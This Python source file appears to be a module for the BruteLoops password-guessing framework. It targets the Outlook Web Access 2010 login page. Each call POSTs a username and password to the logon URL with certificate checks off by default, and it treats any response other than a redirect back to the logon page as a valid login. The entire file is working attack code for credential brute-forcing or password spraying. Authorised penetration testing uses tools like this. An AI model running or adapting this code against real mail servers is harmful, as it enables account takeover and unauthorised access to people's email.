#!/usr/bin/env python3
import warnings
warnings.filterwarnings('ignore')
from re import search
import requests
from BruteLoops.example.module import Module as BLModule

class Module(BLModule):

    name = 'http.owa2010'
    description = brief_description = 'OWA 2010 web interface'

    def __init__(self, url:'required:True,type:str,help:URL to target',
            flags:'required:False,type:int,help:Flags POST parameter value'=0,
            forcedownlevel:'required:False,type:int,help:forcedownlevel POST ' \
                    'parameter value'=0,
            trusted:'required:False,type:int,help:trusted POST parameter value'=0,
            isUtf8:'required:False,type:int,help:isUTF8 POST parameter value'=1,
            proxies:'required:False,type:str,help:HTTP proxies'={},
            headers:'required:False,type:str,help:HTTP headers'={},
            verify_ssl:'required:False,type:str,help:Verify SSL'=False):
        '''
        Arguments:

        - url: string - The URL that credentials will be POSTed to
        - proxies: dict - Proxies configuration passed to requests
        - headers: dict - headers configuration passed to requests
        - verify_ssl: bool - determine if ssl certificate should be verified

        POST parameter arguments:

        These parameters are observed in the POST request sent to the
        server.

        You can get these values by inspecting the request via Burp.

        - flags: int
        - forcedownlevel: int
        - trusted: int
        - isUtf8: int
        '''

        self.url = url
        self.flags = flags
        self.forcedownlevel = forcedownlevel
        self.trusted = trusted
        self.isUtf8 = isUtf8
        self.proxies = proxies
        self.headers = headers
        self.verify_ssl = verify_ssl

    def __call__(self,username,password,*args,**kwargs):
    
        # post data
        data = {
            'destination':self.url,
            'flags':self.flags,
            'forcedownlevel':self.forcedownlevel,
            'trusted':self.trusted,
            'username':username,
            'password':password,
            'isUtf8':self.isUtf8
        }
    
        # make the request
        resp = requests.post(self.url,
                data=data,
                headers=self.headers,
                verify=self.verify_ssl,
                allow_redirects=False,
                proxies=self.proxies)
    
        # verify credentials and return outcome
        if resp.status_code == 302 and resp.headers['Location'] and (
            search(r'auth\/logon\.aspx\?', resp.headers['Location'])):
            return [0, username, password]
        else:
            return [1, username, password]
